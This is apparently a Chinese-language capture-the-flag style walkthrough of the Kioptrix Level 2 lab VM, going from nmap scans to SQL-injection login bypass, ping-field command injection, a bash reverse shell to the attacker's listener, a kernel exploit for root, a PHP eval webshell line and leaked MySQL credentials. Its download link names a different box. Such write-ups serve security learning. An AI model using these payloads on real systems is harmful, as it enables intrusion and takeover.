---
title: Kioptix Level 2
publish_date: 2024-10-12
---

# 搭建

下载地址

https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova

还是老样子，改.vmx文件为nat，然后vmware里面也使用NAT模式

# 网络探测

## IP

攻击机kali的ip

```bash
┌──(root㉿kali)-[/home/kali]
└─# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.85.157  netmask 255.255.255.0  broadcast 192.168.85.255
```

nmap探测靶机IP

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sP 192.168.85.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 10:00 EDT
Nmap scan report for 192.168.85.1
Host is up (0.00018s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.85.2
Host is up (0.00010s latency).
MAC Address: 00:50:56:F8:7C:EB (VMware)
Nmap scan report for 192.168.85.158
Host is up (0.00038s latency).
MAC Address: 00:0C:29:DB:2E:19 (VMware)
Nmap scan report for 192.168.85.254
Host is up (0.00012s latency).
MAC Address: 00:50:56:E3:A5:B9 (VMware)
Nmap scan report for 192.168.85.157
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.97 seconds
```

## 端口

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -A 192.168.85.158  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 10:05 EDT
Nmap scan report for 192.168.85.158
Host is up (0.00048s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            609/udp   status
|_  100024  1            612/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2024-09-21T10:56:53+00:00; -3h09m04s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
631/tcp  open  ipp      CUPS 1.1
|_http-server-header: CUPS/1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:DB:2E:19 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: -3h09m04s

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.85.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
```

整合一下信息：

- **22/tcp (SSH)**：运行的是 **OpenSSH 3.9p1**，支持 SSHv1 协议，这是一个较为过时和不安全的版本。
- **80/tcp (HTTP)**：运行 **Apache HTTPD 2.0.52**，版本较旧，属于 **CentOS** 系统的一部分，可能存在已知漏洞。
- **443/tcp (SSL/HTTP)**：同样运行 **Apache 2.0.52**。
- **111/tcp (RPCBind)**：提供 **rpcbind** 服务，常用于基于 RPC 的网络服务通信。
- **631/tcp (IPP)**：运行 **CUPS 1.1** 打印服务，存在“**403 Forbidden**”错误响应，表明服务存在但禁止访问，且可能存在不安全的 PUT 方法。
- **3306/tcp (MySQL)**：MySQL 服务运行中，但未经授权无法进行连接。
- 系统可能运行 **Linux 内核 2.6.9 - 2.6.30**

# 漏洞发现

还是先看一下80吧

## 80

![image](https://github.com/user-attachments/assets/fb413a74-5ce9-4a8b-aad5-1d72f81a6da5)


一个登录框，简单试了下弱口令没进去，试一下万能密码

结果使用`admin’ or ‘1’ = ‘1`和任意密码成功进入，发现一个执行ping命令的输入框

![image](https://github.com/user-attachments/assets/7111790c-0fd8-4395-87b6-f4928e0bb251)


想到使用`||和&，&&`拼接导致RCE

补充：

```bash
- |：命令1|命令2 ，只执行2
- ||：1失败2执行
- &：不管1都2
- &&：1成功2执行
```

测试一下

![image](https://github.com/user-attachments/assets/92d558b7-a799-417d-a9f8-7fe311a45c43)


```bash
192.168.85.157&whoami

PING 192.168.85.157 (192.168.85.157) 56(84) bytes of data.
64 bytes from 192.168.85.157: icmp_seq=0 ttl=64 time=0.210 ms
apache
64 bytes from 192.168.85.157: icmp_seq=1 ttl=64 time=0.177 ms
64 bytes from 192.168.85.157: icmp_seq=2 ttl=64 time=0.129 ms

--- 192.168.85.157 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.129/0.172/0.210/0.033 ms, pipe 2
```

成功执行了我们的whoami，显示为apache用户

这里就可以试下反弹shell了

- 直接执行反弹shell命令
    - kali监听一下，命令`nc -lvvp 9988`
    - 命令`192.168.85.157&bash -i >& /dev/tcp/192.168.85.157/9988 0>&1`
    
    ```bash
    ┌──(root㉿kali)-[/home/kali]
    └─# nc -lvvp 9988
    listening on [any] 9988 ...
    192.168.85.158: inverse host lookup failed: Unknown host
    connect to [192.168.85.157] from (UNKNOWN) [192.168.85.158] 32769
    bash: no job control in this shell
    bash-3.00$ whoami
    apache
    bash-3.00$ 
    ```
    
    成功shell，但是权限有点低了，得提权
    
    个人习惯，发现一个点就得打到位不然先不去看其他的
    
    - 提权
        
        记得前面有一个内核版本低得问题，看一下能不能利用提权
        
        ```bash
        ┌──(root㉿kali)-[/home/kali]
        └─# searchsploit linux kernel centos 2.6 
        -------------------------------------------------------------------------------------------------------------------- ---------------------------------
         Exploit Title                                                                                                      |  Path
        -------------------------------------------------------------------------------------------------------------------- ---------------------------------
        Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' L | linux/local/9545.c
        Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privil | linux/local/9479.c
        Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privile | linux_x86/local/9542.c
        Linux Kernel 2.6.32 < 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege Escalation (1)                               | linux/local/25444.c
        Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege Escalat | linux_x86-64/local/45516.c
        -------------------------------------------------------------------------------------------------------------------- ---------------------------------
        Shellcodes: No Results
        ```
        
        只有3，4符合，我们先试一下3，应为靶机是2.6.9-2.6.30 ，3得概率大点
        
        1. 下载exp
            
            `expsearchsploit -m linux_x86/local/9542.c` 
            
        2. python起一个临时服务用来传输exp
            
            `python3 -m http.server 8877`
            
        3. 靶机下载exp
            
            这里要注意使用ls -l找一个有写入和执行权限得目录
            
            ```bash
            bash-3.00$ ls -l
            total 158
            ......
            drwxr-xrwx   4 root root  4096 Sep 21 06:48 tmp
            ......
            ```
            
            我们写入tmp目录
            
            ```bash
            bash-3.00$ wget http://192.168.85.157:8877/9542.c
            --07:38:11--  http://192.168.85.157:8877/9542.c
                       => `9542.c'
            Connecting to 192.168.85.157:8877... connected.
            HTTP request sent, awaiting response... 200 OK
            Length: 2,535 (2.5K) [text/x-csrc]
            
                0K ..                                                    100%  302.20 MB/s
            
            07:38:11 (302.20 MB/s) - `9542.c' saved [2535/2535]
            
            bash-3.00$ ls
            9542.c
            
            ```
            
        4. 编译执行
            
            ```bash
            bash-3.00$ gcc 9542.c
            9542.c:109:28: warning: no newline at end of file
            bash-3.00$ ls
            9542.c
            a.out
            bash-3.00$ ./a.out
            sh: no job control in this shell
            sh-3.00# whoami
            root
            ```
            
            成功拿下root权限
            
- 写php马
    
    前面测试执行命令的时候我们可以看到该网站使用的php，并且前面可以通过pwd看到目录，想试一下写php马看看
    
    `echo "<?php @eval(\$_POST[cmd]);?>" > shell.php`
    
    正准备写呢看了一下html文件夹的权限
    
    ```bash
    bash-3.00$ ls -l
    total 48
    drwxr-xr-x   2 root      root 4096 May  4  2007 cgi-bin
    drwxr-xr-x   3 root      root 4096 Oct  7  2009 error
    drwxr-xr-x   2 root      root 4096 Oct  8  2009 html
    drwxr-xr-x   3 root      root 4096 Oct  8  2009 icons
    drwxr-xr-x  13 root      root 4096 Oct  7  2009 manual
    drwxr-xr-x   2 webalizer root 4096 Oct  9  2009 usage
    ```
    
    gg,看来80就到这了
    

## 3306

index.php泄露了数据库的一个用户的账号密码

```bash
mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
```

但是应该是没开远程连接无法连接

# 总结

该靶场主要是考察了sql注入和RCE的相关知识
